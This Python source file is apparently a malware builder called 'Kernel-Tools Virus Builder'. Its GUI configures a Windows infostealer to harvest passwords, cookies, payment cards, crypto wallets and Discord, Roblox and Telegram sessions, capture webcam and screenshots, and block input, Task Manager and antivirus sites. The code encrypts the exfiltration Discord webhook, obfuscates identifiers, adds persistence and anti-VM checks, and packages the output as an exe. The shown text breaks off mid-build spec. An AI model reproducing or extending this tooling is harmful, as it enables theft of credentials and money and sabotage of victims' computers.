import os
import sys
import ctypes
import json
import shutil
import random
import string
import ast
import base64
import subprocess
import time

# ── Config ─────────────────────────────────────────────────────────────────────
version_tool = "v3.2"
tool_path    = os.path.dirname(os.path.abspath(__file__))
github_tool  = "https://github.com/Kernel-Tools"
name_tool    = "Kernel-Tools"

# ── Console ────────────────────────────────────────────────────────────────────
reset        = "\033[0m"
white        = "\033[97m"
RESET        = "\033[0m"
BLUE         = "\033[94m"
GREEN        = "\033[92m"
RED          = "\033[91m"
GRAY         = "\033[90m"
WHITE        = "\033[97m"
BEFORE       = "\033[90m["
AFTER        = "]\033[0m"
INFO         = "\033[94mINFO\033[0m"
ERROR        = "\033[91mERROR\033[0m"
ADD          = "\033[92mADD\033[0m"
WAIT         = "\033[93mWAIT\033[0m"
BEFORE_GREEN = "\033[92m"
AFTER_GREEN  = "\033[0m"

def current_time_hour():
    from datetime import datetime
    return datetime.now().strftime("%H:%M:%S")

def Title(t):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(t)
    except: pass

def ErrorModule(e):
    print(f"[ERROR] Missing module: {e}")
    print("Install: pip install customtkinter cryptography requests")
    input("Press Enter...")
    sys.exit(1)

def Error(e):
    print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} {e}")

def Continue():
    input(f"\n{BEFORE}{current_time_hour()}{AFTER} {INFO} Press Enter to exit...")

def Reset():
    sys.exit(0)

Title("Kernel Builder")

try:
    import customtkinter as ctk
    import tkinter
    from tkinter import filedialog, messagebox
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
except Exception as e:
    ErrorModule(e)

try:
    import requests
except:
    requests = None

print(f"""{BLUE}
╔══════════════════════════════════════╗
║   KERNEL-TOOLS  VIRUS BUILDER v3.2  ║
╚══════════════════════════════════════╝{RESET}""")

try:
    exit_window = False

    colors = {
        "white"     : "#ffffff",
        "blue"      : "#2563eb",
        "dark_blue" : "#1e40af",
        "dark_gray" : "#1e1e1e",
        "gray"      : "#444444",
        "light_gray": "#949494",
        "background": "#000000",
    }

    def ClosingWindow():
        global exit_window
        exit_window = True
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: builder.after_cancel(after_id)
            except: pass
        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    def ClosingBuild():
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: builder.after_cancel(after_id)
            except: pass
        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    builder = ctk.CTk()
    builder.title(f"Kernel-Tools {version_tool} - Kernel Builder")
    builder.geometry("800x900")
    builder.resizable(True, True)
    builder.minsize(800, 900)
    builder.configure(fg_color=colors["background"])
    builder.grid_columnconfigure(0, weight=1)

    option_system             = "Disable"
    option_wallets            = "Disable"
    option_game_launchers     = "Disable"
    option_apps               = "Disable"
    option_discord            = "Disable"
    option_discord_injection  = "Disable"
    option_passwords          = "Disable"
    option_cookies            = "Disable"
    option_history            = "Disable"
    option_downloads          = "Disable"
    option_cards              = "Disable"
    option_extentions         = "Disable"
    option_interesting_files  = "Disable"
    option_roblox             = "Disable"
    option_webcam             = "Disable"
    option_screenshot         = "Disable"
    option_block_key          = "Disable"
    option_block_mouse        = "Disable"
    option_block_task_manager = "Disable"
    option_block_website      = "Disable"
    option_shutdown           = "Disable"
    option_spam_open_programs = "Disable"
    option_spam_create_files  = "Disable"
    option_fake_error         = "Disable"
    option_startup            = "Disable"
    option_restart            = "Disable"
    option_anti_vm_and_debug  = "Disable"
    webhook                   = "None"
    name_file                 = "None"
    icon_path                 = None
    file_type                 = "None"
    fake_error_title          = "Microsoft Excel"
    fake_error_message        = "The file is corrupt and cannot be opened."

    option_system_var             = ctk.StringVar(value="Disable")
    option_wallets_var            = ctk.StringVar(value="Disable")
    option_game_launchers_var     = ctk.StringVar(value="Disable")
    option_apps_var               = ctk.StringVar(value="Disable")
    option_roblox_var             = ctk.StringVar(value="Disable")
    option_discord_var            = ctk.StringVar(value="Disable")
    option_discord_injection_var  = ctk.StringVar(value="Disable")
    option_passwords_var          = ctk.StringVar(value="Disable")
    option_cookies_var            = ctk.StringVar(value="Disable")
    option_history_var            = ctk.StringVar(value="Disable")
    option_downloads_var          = ctk.StringVar(value="Disable")
    option_cards_var              = ctk.StringVar(value="Disable")
    option_extentions_var         = ctk.StringVar(value="Disable")
    option_interesting_files_var  = ctk.StringVar(value="Disable")
    option_webcam_var             = ctk.StringVar(value="Disable")
    option_screenshot_var         = ctk.StringVar(value="Disable")
    option_block_key_var          = ctk.StringVar(value="Disable")
    option_block_mouse_var        = ctk.StringVar(value="Disable")
    option_block_task_manager_var = ctk.StringVar(value="Disable")
    option_block_website_var      = ctk.StringVar(value="Disable")
    option_shutdown_var           = ctk.StringVar(value="Disable")
    option_spam_open_programs_var = ctk.StringVar(value="Disable")
    option_spam_create_files_var  = ctk.StringVar(value="Disable")
    option_fake_error_var         = ctk.StringVar(value="Disable")
    option_startup_var            = ctk.StringVar(value="Disable")
    option_restart_var            = ctk.StringVar(value="Disable")
    option_anti_vm_and_debug_var  = ctk.StringVar(value="Disable")
    file_type_var                 = ctk.StringVar(value="File Type")

    def ErrorLogs(message):
        print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} {message}{white}")
        try: messagebox.showerror(f"Kernel-Tools {version_tool} - Kernel Builder", message)
        except: pass

    def InfoLogs(message):
        try: messagebox.showinfo(f"Kernel-Tools {version_tool} - Kernel Builder", message)
        except: print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} {message}")

    def TestWebhook():
        url = webhook_url.get().strip()
        if not url:
            ErrorLogs("Please enter a webhook URL.")
            return
        if requests is None:
            ErrorLogs("requests not installed. Run: pip install requests")
            return
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                InfoLogs("The webhook is valid.")
            else:
                ErrorLogs(f"The webhook is invalid. (Status: {r.status_code})")
        except Exception as e:
            ErrorLogs(f"Could not reach webhook: {str(e)}")

    def ChooseIcon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = filedialog.askopenfilename(
                    parent=root,
                    title=f"{name_tool} {version_tool} - Choose an icon (.ico)",
                    filetypes=[("ICO files", "*.ico")])
            elif sys.platform.startswith("linux"):
                icon_path = filedialog.askopenfilename(
                    title=f"{name_tool} {version_tool} - Choose an icon (.ico)",
                    filetypes=[("ICO files", "*.ico")])
        except: pass

    fake_error_window_status = True

    def CreateFakeErrorWindow():
        global fake_error_window_status
        if fake_error_window_status:
            fake_error_window_status = False
        else:
            fake_error_window_status = True
            return

        fake_error_window = ctk.CTkToplevel(builder)
        fake_error_window.title(f"Kernel-Tools {version_tool} - Fake Error")
        fake_error_window.geometry("320x220")
        fake_error_window.resizable(False, False)
        fake_error_window.configure(fg_color=colors["background"])
        fake_error_window.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(fake_error_window, text="Fake Error Settings",
            font=ctk.CTkFont(family="Helvetica", size=14, weight="bold"),
            text_color=colors["blue"]).grid(row=0, column=0, pady=(15, 5), sticky="we")

        fake_error_title_entry = ctk.CTkEntry(fake_error_window, justify="center",
            placeholder_text="Error Title (ex: Microsoft Excel)",
            fg_color=colors["dark_gray"], border_color=colors["blue"],
            font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=280)
        fake_error_title_entry.grid(row=1, column=0, padx=20, pady=(5, 5), sticky="we")
        fake_error_title_entry.insert(0, fake_error_title)

        fake_error_message_entry = ctk.CTkEntry(fake_error_window, justify="center",
            placeholder_text="Error Message",
            fg_color=colors["dark_gray"], border_color=colors["blue"],
            font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=280)
        fake_error_message_entry.grid(row=2, column=0, padx=20, pady=(0, 10), sticky="we")
        fake_error_message_entry.insert(0, fake_error_message)

        def Validate():
            global fake_error_title, fake_error_message
            t = fake_error_title_entry.get()
            m = fake_error_message_entry.get()
            if t: fake_error_title   = t
            if m: fake_error_message = m
            print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Fake Error Title  : {white}{fake_error_title}")
            print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Fake Error Message: {white}{fake_error_message}")
            fake_error_window.quit()

        ctk.CTkButton(fake_error_window, text="Validate", command=Validate,
            fg_color=colors["blue"], hover_color=colors["dark_blue"],
            font=ctk.CTkFont(family="Helvetica", size=14), height=40).grid(
            row=3, column=0, padx=20, pady=5, sticky="we")

        fake_error_window.mainloop()

    # ── Title Frame ─────────────────────────────────────────────────────────────
    title_frame = ctk.CTkFrame(builder, fg_color=colors["background"])
    title_frame.grid(row=0, column=0, sticky="we", pady=(10, 0), padx=10)
    title_frame.grid_columnconfigure(0, weight=1)
    title_frame.grid_columnconfigure(1, weight=1)

    ctk.CTkLabel(title_frame, text="Kernel Builder",
        font=ctk.CTkFont(family="Helvetica", size=40, weight="bold"),
        text_color=colors["blue"]).grid(row=0, columnspan=2, sticky="we")

    ctk.CTkLabel(title_frame,
        text="The builder only creates viruses that work under Windows.",
        font=ctk.CTkFont(family="Helvetica", size=13),
        text_color=colors["blue"]).grid(row=1, columnspan=2, sticky="we")

    ctk.CTkLabel(title_frame, text=github_tool,
        font=ctk.CTkFont(family="Helvetica", size=14),
        text_color=colors["white"]).grid(row=2, columnspan=2, pady=(2, 8), sticky="we")

    webhook_url = ctk.CTkEntry(title_frame, height=45, corner_radius=5,
        font=ctk.CTkFont(family="Helvetica", size=14), justify="center",
        border_color=colors["blue"], fg_color=colors["dark_gray"], border_width=2,
        placeholder_text="https://discord.com/api/webhooks/...",
        text_color=colors["white"])
    webhook_url.grid(row=3, column=0, padx=(20, 5), pady=(0, 10), sticky="we")

    ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook,
        height=45, corner_radius=5, fg_color=colors["blue"],
        hover_color=colors["dark_blue"],
        font=ctk.CTkFont(family="Helvetica", size=14)).grid(
        row=3, column=1, padx=(5, 20), pady=(0, 10), sticky="we")

    # ── Stealer Frame ───────────────────────────────────────────────────────────
    sf = ctk.CTkFrame(builder, fg_color=colors["dark_gray"])
    sf.grid(row=1, column=0, sticky="we", pady=(10, 0), padx=40)
    sf.grid_columnconfigure(0, weight=1)
    sf.grid_columnconfigure(1, weight=1)
    sf.grid_columnconfigure(2, weight=1)

    def mkch(parent, text, var, cmd=None):
        kw = dict(text=text, variable=var, onvalue="Enable", offvalue="Disable",
            fg_color=colors["blue"], hover_color=colors["dark_blue"],
            border_color=colors["blue"],
            font=ctk.CTkFont(family="Helvetica", size=13),
            text_color=colors["white"])
        if cmd: kw["command"] = cmd
        return ctk.CTkCheckBox(parent, **kw)

    mkch(sf, "System Info",            option_system_var).grid(            row=0, column=0, padx=(50,5), pady=(12,4), sticky="w")
    mkch(sf, "Wallets Session Files",  option_wallets_var).grid(           row=1, column=0, padx=(50,5), pady=4,      sticky="w")
    mkch(sf, "Games Session Files",    option_game_launchers_var).grid(    row=2, column=0, padx=(50,5), pady=4,      sticky="w")
    mkch(sf, "Telegram Session Files", option_apps_var).grid(              row=3, column=0, padx=(50,5), pady=4,      sticky="w")
    mkch(sf, "Roblox Accounts",        option_roblox_var).grid(            row=4, column=0, padx=(50,5), pady=4,      sticky="w")
    mkch(sf, "Discord Accounts",       option_discord_var).grid(           row=5, column=0, padx=(50,5), pady=(4,12), sticky="w")
    mkch(sf, "Discord Injection",      option_discord_injection_var).grid( row=0, column=1, padx=5,      pady=(12,4), sticky="w")
    mkch(sf, "Passwords",              option_passwords_var).grid(         row=1, column=1, padx=5,      pady=4,      sticky="w")
    mkch(sf, "Cookies",                option_cookies_var).grid(           row=2, column=1, padx=5,      pady=4,      sticky="w")
    mkch(sf, "Browsing History",       option_history_var).grid(           row=3, column=1, padx=5,      pady=4,      sticky="w")
    mkch(sf, "Download History",       option_downloads_var).grid(         row=4, column=1, padx=5,      pady=4,      sticky="w")
    mkch(sf, "Cards",                  option_cards_var).grid(             row=5, column=1, padx=5,      pady=(4,12), sticky="w")
    mkch(sf, "Extentions",             option_extentions_var).grid(        row=0, column=2, padx=5,      pady=(12,4), sticky="w")
    mkch(sf, "Interesting Files",      option_interesting_files_var).grid( row=1, column=2, padx=5,      pady=4,      sticky="w")
    mkch(sf, "Webcam",                 option_webcam_var).grid(            row=2, column=2, padx=5,      pady=4,      sticky="w")
    mkch(sf, "Screenshot",             option_screenshot_var).grid(        row=3, column=2, padx=5,      pady=4,      sticky="w")

    # ── Malware Frame ───────────────────────────────────────────────────────────
    mf = ctk.CTkFrame(builder, fg_color=colors["dark_gray"])
    mf.grid(row=2, column=0, sticky="we", pady=(10, 0), padx=40)
    mf.grid_columnconfigure(0, weight=1)
    mf.grid_columnconfigure(1, weight=1)
    mf.grid_columnconfigure(2, weight=1)

    mkch(mf, "Block Key",          option_block_key_var).grid(          row=0, column=0, padx=(50,5), pady=(12,4), sticky="w")
    mkch(mf, "Block Mouse",        option_block_mouse_var).grid(        row=1, column=0, padx=(50,5), pady=4,      sticky="w")
    mkch(mf, "Block Task Manager", option_block_task_manager_var).grid( row=2, column=0, padx=(50,5), pady=4,      sticky="w")
    mkch(mf, "Block AV Website",   option_block_website_var).grid(      row=3, column=0, padx=(50,5), pady=(4,12), sticky="w")
    mkch(mf, "Spam Open Program",  option_spam_open_programs_var).grid( row=0, column=1, padx=5,      pady=(12,4), sticky="w")
    mkch(mf, "Spam Create File",   option_spam_create_files_var).grid(  row=1, column=1, padx=5,      pady=4,      sticky="w")
    mkch(mf, "Shutdown",           option_shutdown_var).grid(           row=2, column=1, padx=5,      pady=4,      sticky="w")
    mkch(mf, "Fake Error",         option_fake_error_var, CreateFakeErrorWindow).grid(row=3, column=1, padx=5, pady=(4,12), sticky="w")
    mkch(mf, "Anti VM & Debug",    option_anti_vm_and_debug_var).grid(  row=0, column=2, padx=5,      pady=(12,4), sticky="w")
    mkch(mf, "Launch at Startup",  option_startup_var).grid(            row=1, column=2, padx=5,      pady=4,      sticky="w")
    mkch(mf, "Restart Every 5min", option_restart_var).grid(            row=2, column=2, padx=5,      pady=4,      sticky="w")

    # ── Build Frame ─────────────────────────────────────────────────────────────
    bf = ctk.CTkFrame(builder, fg_color=colors["background"])
    bf.grid(row=3, column=0, sticky="we", pady=(15, 0), padx=40)
    bf.grid_columnconfigure(0, weight=1)
    bf.grid_columnconfigure(1, weight=1)
    bf.grid_columnconfigure(2, weight=1)

    name_file_entry = ctk.CTkEntry(bf, height=40, corner_radius=5,
        font=ctk.CTkFont(family="Helvetica", size=13), justify="center",
        border_color=colors["blue"], text_color=colors["white"],
        fg_color=colors["dark_gray"], border_width=2, placeholder_text="File Name")
    name_file_entry.grid(row=0, column=0, padx=(0, 5), pady=5, sticky="we")

    def FileTypeChanged(*args):
        if file_type_var.get() in ("Python File", "File Type"):
            icon_button.configure(state="disabled")
        else:
            icon_button.configure(state="normal")

    file_type_menu = ctk.CTkOptionMenu(bf, height=40,
        font=ctk.CTkFont(family="Helvetica", size=13), variable=file_type_var,
        values=["Python File", "Exe File"],
        fg_color=colors["dark_gray"], button_color=colors["blue"],
        button_hover_color=colors["dark_blue"])
    file_type_menu.grid(row=0, column=1, padx=5, pady=5, sticky="we")

    icon_button = ctk.CTkButton(bf, height=40, text="Select Icon",
        command=ChooseIcon, fg_color=colors["blue"], hover_color=colors["dark_blue"],
        text_color_disabled=colors["light_gray"])
    icon_button.grid(row=0, column=2, padx=(5, 0), pady=5, sticky="we")
    icon_button.configure(state="disabled")
    file_type_var.trace_add("write", lambda *args: FileTypeChanged())

    def BuildSettings():
        global option_system, option_wallets, option_game_launchers, option_apps
        global option_discord, option_discord_injection, option_passwords, option_cookies
        global option_history, option_downloads, option_cards, option_extentions
        global option_interesting_files, option_roblox, option_webcam, option_screenshot
        global option_block_key, option_block_mouse, option_block_task_manager, option_block_website
        global option_spam_open_programs, option_spam_create_files, option_shutdown, option_fake_error
        global option_startup, option_restart, option_anti_vm_and_debug, webhook, name_file, file_type

        option_system             = option_system_var.get()
        option_wallets            = option_wallets_var.get()
        option_game_launchers     = option_game_launchers_var.get()
        option_apps               = option_apps_var.get()
        option_discord            = option_discord_var.get()
        option_discord_injection  = option_discord_injection_var.get()
        option_passwords          = option_passwords_var.get()
        option_cookies            = option_cookies_var.get()
        option_history            = option_history_var.get()
        option_downloads          = option_downloads_var.get()
        option_cards              = option_cards_var.get()
        option_extentions         = option_extentions_var.get()
        option_interesting_files  = option_interesting_files_var.get()
        option_roblox             = option_roblox_var.get()
        option_webcam             = option_webcam_var.get()
        option_screenshot         = option_screenshot_var.get()
        option_block_website      = option_block_website_var.get()
        option_block_key          = option_block_key_var.get()
        option_block_mouse        = option_block_mouse_var.get()
        option_block_task_manager = option_block_task_manager_var.get()
        option_shutdown           = option_shutdown_var.get()
        option_spam_open_programs = option_spam_open_programs_var.get()
        option_spam_create_files  = option_spam_create_files_var.get()
        option_fake_error         = option_fake_error_var.get()
        option_startup            = option_startup_var.get()
        option_restart            = option_restart_var.get()
        option_anti_vm_and_debug  = option_anti_vm_and_debug_var.get()
        webhook                   = webhook_url.get()
        name_file                 = name_file_entry.get()
        file_type                 = file_type_var.get()

        if not webhook.strip():
            ErrorLogs("Please enter the webhook.")
            return
        if not name_file.strip():
            ErrorLogs("Please choose the file name.")
            return
        if file_type == "File Type":
            ErrorLogs("Please choose the file type.")
            return

        ClosingBuild()

    build = ctk.CTkButton(builder, text="Build", command=BuildSettings,
        height=45, corner_radius=5, fg_color=colors["blue"],
        hover_color=colors["dark_blue"],
        font=ctk.CTkFont(family="Helvetica", size=15, weight="bold"))
    build.grid(row=4, column=0, padx=280, pady=20, sticky="we")

    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)
    builder.mainloop()

    if not exit_window:
        builder.destroy()

    time.sleep(1)

    if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
        print(f"\n{BEFORE}{current_time_hour()}{AFTER} {ERROR} Window closed without building.")
        Continue()
        Reset()

    option_extentions        = option_extentions_var.get()
    option_interesting_files = option_interesting_files_var.get()

    print(f"""
{RED}Stealer Options:{RESET}
{option_system            } System Info            {option_discord_injection } Discord Injection      {option_extentions       } Extentions
{option_wallets           } Wallets Session Files  {option_passwords         } Passwords              {option_interesting_files} Interesting Files
{option_game_launchers    } Games Session Files    {option_cookies           } Cookies                {option_webcam           } Webcam
{option_apps              } Telegram Session Files {option_history           } Browsing History       {option_screenshot       } Screenshot
{option_roblox            } Roblox Accounts        {option_downloads         } Download History
{option_discord           } Discord Accounts       {option_cards             } Cards

{RED}Malware Options:{RESET}
{option_block_key         } Block Key              {option_shutdown          } Shutdown               {option_anti_vm_and_debug} Anti VM & Debug
{option_block_mouse       } Block Mouse            {option_fake_error        } Fake Error             {option_startup          } Launch at Startup
{option_block_task_manager} Block Task Manager     {option_spam_open_programs} Spam Open Program      {option_restart          } Restart Every 5min
{option_block_website     } Block AV Website       {option_spam_create_files } Spam Create File
""".replace("Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace("Disable", f"{BEFORE}x{AFTER}"))

    if option_fake_error == "Enable":
        print(f"{RED}Fake Error Title   : {white}{fake_error_title}")
        print(f"{RED}Fake Error Message : {white}{fake_error_message}{RESET}")

    print(f"{RED}Webhook   : {white}{webhook[:90]}{'...' if len(webhook)>90 else ''}")
    print(f"{RED}File Type : {white}{file_type}")
    print(f"{RED}File Name : {white}{name_file}{RESET}")

    if icon_path:
        icon_path_cut = icon_path[:100] + '..' if len(icon_path) > 100 else icon_path
        print(f"{RED}Icon Path : {white}{icon_path_cut}{RESET}")

    # ── Encryption ──────────────────────────────────────────────────────────────
    def Encryption(wh):
        def DeriveKey(password, salt):
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt,
                iterations=100000, backend=default_backend())
            if isinstance(password, str): password = password.encode()
            return kdf.derive(password)

        def Encrypt(decrypted, key):
            salt        = os.urandom(16)
            derived_key = DeriveKey(key, salt)
            iv          = os.urandom(16)
            padder      = padding.PKCS7(128).padder()
            padded      = padder.update(decrypted.encode()) + padder.finalize()
            cipher      = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
            enc         = cipher.encryptor()
            encrypted   = enc.update(padded) + enc.finalize()
            return base64.b64encode(salt + iv + encrypted).decode()

        key_enc = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=random.randint(100, 200)))
        print(f"\n{BEFORE}{current_time_hour()}{AFTER} {INFO} Encryption key created: {white}{key_enc[:75]}..{RESET}")
        wh_enc = Encrypt(wh, key_enc)
        print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Encrypted webhook: {white}{wh_enc[:75]}..{RESET}")
        return key_enc, wh_enc

    # ── PythonFile ──────────────────────────────────────────────────────────────
    def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
        if file_type in ["Exe File", "Python File"]:
            try:
                browser_choice = []
                if option_extentions      == 'Enable': browser_choice.append('"extentions"')
                if option_passwords       == 'Enable': browser_choice.append('"passwords"')
                if option_cookies         == 'Enable': browser_choice.append('"cookies"')
                if option_history         == 'Enable': browser_choice.append('"history"')
                if option_downloads       == 'Enable': browser_choice.append('"downloads"')
                if option_cards           == 'Enable': browser_choice.append('"cards"')

                session_files_choice = []
                if option_wallets        == 'Enable': session_files_choice.append('"Wallets"')
                if option_game_launchers == 'Enable': session_files_choice.append('"Game Launchers"')
                if option_apps           == 'Enable': session_files_choice.append('"Apps"')

                out_dir = os.path.dirname(file_python)
                if out_dir: os.makedirs(out_dir, exist_ok=True)

                with open(file_python, 'w', encoding='utf-8') as f:
                    if option_anti_vm_and_debug == 'Enable': f.write(Ant1VM4ndD3bug)
                    f.write(Obligatory
                        .replace("%WEBHOOK_URL%", webhook_encrypted)
                        .replace("%KEY%",         key_encryption)
                        .replace("%LINK_GITHUB%", github_tool)
                        .replace("%LINK_WEBSITE%",website))
                    if option_system            == 'Enable': f.write(Sy5t3mInf0)
                    if option_discord           == 'Enable': f.write(Di5c0rdAccount)
                    if option_discord_injection == 'Enable': f.write(Di5c0rdIj3ct10n)
                    if option_interesting_files == 'Enable': f.write(Int3r3stingFil3s)
                    if session_files_choice:
                        f.write(S3ssi0nFil3s.replace('"%SESSION_FILES_CHOICE%"', ', '.join(session_files_choice)))
                    if browser_choice:
                        f.write(Br0w53r5t341.replace('"%BROWSER_CHOICE%"', ', '.join(browser_choice)))
                    if option_roblox            == 'Enable': f.write(R0b10xAccount)
                    if option_webcam            == 'Enable': f.write(W3bc4m)
                    if option_screenshot        == 'Enable': f.write(Scr33n5h0t)
                    if option_block_key         == 'Enable': f.write(B10ckK3y)
                    if option_block_mouse       == 'Enable': f.write(B10ckM0u53)
                    if option_block_task_manager== 'Enable': f.write(B10ckT45kM4n4g3r)
                    if option_block_website     == 'Enable': f.write(B10ckW3b5it3)
                    if option_fake_error        == 'Enable': f.write(F4k33rr0r(fake_error_title, fake_error_message))
                    if option_spam_open_programs== 'Enable': f.write(Sp4m0p3nPr0gr4m)
                    if option_spam_create_files == 'Enable': f.write(Sp4mCr34tFil3)
                    if option_shutdown          == 'Enable': f.write(Shutd0wn)
                    if option_startup           == 'Enable': f.write(St4rtup)
                    if option_spam_open_programs == 'Enable' or option_block_mouse == 'Enable' or option_spam_create_files == 'Enable':
                        f.write(Sp4mOpti0ns)
                    if option_restart           == 'Enable': f.write(R3st4rt)
                    f.write(St4rt)

                print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Python file created: {white}{file_python_relative}{RESET}")
            except Exception as e:
                print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Python file not created: {white}{e}{RESET}")
                Continue()
                Reset()

    # ── Obfuscation ─────────────────────────────────────────────────────────────
    def PythonIdentifierObfuscation(file_python):
        if file_type in ["Exe File", "Python File"]:
            try:
                variable_map = {}
                def RandomName():
                    return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50, 100)))
                with open(file_python, 'r', encoding='utf-8') as f:
                    original_script = f.read()
                def visit_node(node):
                    if isinstance(node, ast.Assign):
                        for target in node.targets:
                            if isinstance(target, ast.Name):
                                if target.id not in variable_map and "v4r_" in target.id:
                                    variable_map[target.id] = RandomName()
                    elif isinstance(node, ast.FunctionDef):
                        if "D3f_" in node.name and node.name not in variable_map:
                            variable_map[node.name] = RandomName()
                            for arg in node.args.args:
                                if arg.arg not in variable_map and "v4r_" in arg.arg:
                                    variable_map[arg.arg] = RandomName()
                    elif isinstance(node, ast.ClassDef):
                        if node.name not in variable_map and "v4r_" in node.name:
                            variable_map[node.name] = RandomName()
                    for child in ast.iter_child_nodes(node):
                        visit_node(child)
                visit_node(ast.parse(original_script))
                with open(file_python, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                with open(file_python, 'w', encoding='utf-8') as f:
                    for line in lines:
                        for old, new in variable_map.items():
                            line = line.replace(old, new)
                        f.write(line)
                print(f"{BEFORE}{current_time_hour()}{AFTER} {INFO} Obfuscation done.{RESET}")
            except Exception as e:
                print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Obfuscation error: {e}{RESET}")

    # ── SendWebhook ─────────────────────────────────────────────────────────────
    def SendWebhook(wh):
        if requests is None: return
        try:
            embed_config = {
                'title': 'V1ru5 Created (C0nf1g):',
                'color': color_webhook,
                "fields": [
                    {"name": "Name:",    "value": f"```{name_file}```", "inline": True},
                    {"name": "Type:",    "value": f"```{file_type}```", "inline": True},
                    {"name": "Webhook:", "value": f"{wh}",              "inline": False},
                ],
                'footer': {"text": username_webhook, "icon_url": avatar_webhook}
            }
            embed_stealer = {
                'title': 'V1ru5 Created (St34l3r):',
                'color': color_webhook,
                "fields": [
                    {"name": "System Info:",            "value": f"```{option_system}```",            "inline": True},
                    {"name": "Wallets Session Files:",  "value": f"```{option_wallets}```",           "inline": True},
                    {"name": "Games Session Files:",    "value": f"```{option_game_launchers}```",    "inline": True},
                    {"name": "Telegram Session Files:", "value": f"```{option_apps}```",              "inline": True},
                    {"name": "Roblox Accounts:",        "value": f"```{option_roblox}```",            "inline": True},
                    {"name": "Discord Accounts:",       "value": f"```{option_discord}```",           "inline": True},
                    {"name": "Discord Injection:",      "value": f"```{option_discord_injection}```", "inline": True},
                    {"name": "Passwords:",              "value": f"```{option_passwords}```",         "inline": True},
                    {"name": "Cookies:",                "value": f"```{option_cookies}```",           "inline": True},
                    {"name": "Browsing History:",       "value": f"```{option_history}```",           "inline": True},
                    {"name": "Download History:",       "value": f"```{option_downloads}```",         "inline": True},
                    {"name": "Cards:",                  "value": f"```{option_cards}```",             "inline": True},
                    {"name": "Extentions:",             "value": f"```{option_extentions}```",        "inline": True},
                    {"name": "Interesting Files:",      "value": f"```{option_interesting_files}```", "inline": True},
                    {"name": "Webcam:",                 "value": f"```{option_webcam}```",            "inline": True},
                    {"name": "Screenshot:",             "value": f"```{option_screenshot}```",        "inline": True},
                ],
                'footer': {"text": username_webhook, "icon_url": avatar_webhook}
            }
            embed_malware = {
                'title': 'V1ru5 Created (M4lw4r3):',
                'color': color_webhook,
                "fields": [
                    {"name": "Block Key:",          "value": f"```{option_block_key}```",          "inline": True},
                    {"name": "Block Mouse:",        "value": f"```{option_block_mouse}```",        "inline": True},
                    {"name": "Block Task Manager:", "value": f"```{option_block_task_manager}```", "inline": True},
                    {"name": "Block AV Website:",   "value": f"```{option_block_website}```",      "inline": True},
                    {"name": "Shutdown:",           "value": f"```{option_shutdown}```",           "inline": True},
                    {"name": "Spam Open Program:",  "value": f"```{option_spam_open_programs}```", "inline": True},
                    {"name": "Spam Create File:",   "value": f"```{option_spam_create_files}```",  "inline": True},
                    {"name": "Fake Error:",         "value": f"```{option_fake_error}```",         "inline": True},
                    {"name": "Launch At Startup:",  "value": f"```{option_startup}```",            "inline": True},
                    {"name": "Restart Every 5min:", "value": f"```{option_restart}```",            "inline": True},
                    {"name": "Anti VM & Debug:",    "value": f"```{option_anti_vm_and_debug}```",  "inline": True},
                ],
                'footer': {"text": username_webhook, "icon_url": avatar_webhook}
            }
            h = {'Content-Type': 'application/json'}
            requests.post(wh, data=json.dumps({'embeds': [embed_config],  'username': username_webhook, 'avatar_url': avatar_webhook}), headers=h)
            requests.post(wh, data=json.dumps({'embeds': [embed_stealer], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers=h)
            requests.post(wh, data=json.dumps({'embeds': [embed_malware], 'username': username_webhook, 'avatar_url': avatar_webhook}), headers=h)
        except Exception as e:
            print(f"{BEFORE}{current_time_hour()}{AFTER} {ERROR} Webhook send error: {e}{RESET}")

    # ── ConvertToExe ────────────────────────────────────────────────────────────
    def create_pyinstaller_spec(file_python, name_file, icon_path, path_destination):
        spec_content = f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    [r'{file_python}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'win32api',
        'win32con',
        'win32crypt',
        'win32security',
        'win32process',
        'pywintypes',
        'discord',
        'discord.webhook',
        'discord.ext',
        'discord.ext.commands',
        'discord.app_commands',
        'discord.ui',
        'discord.errors',
        'discord.http',
        'discord.gateway',
        'discord.client',
        'discord.user',
        'discord.message',
        'discord.channel',
        'discord.guild',
        'discord.member',
        'discord.embeds',
        'discord.permissions',
        'discord.role',
        'discord.emoji',
        'discord.partial_emoji',
        'discord.asset',
        'discord.colour',
        'discord.enums',
        'discord.flags',
        'discord.file',
        'discord.invite',
        'discord.widget',
        'discord.threads',
        'discord.voice_client',
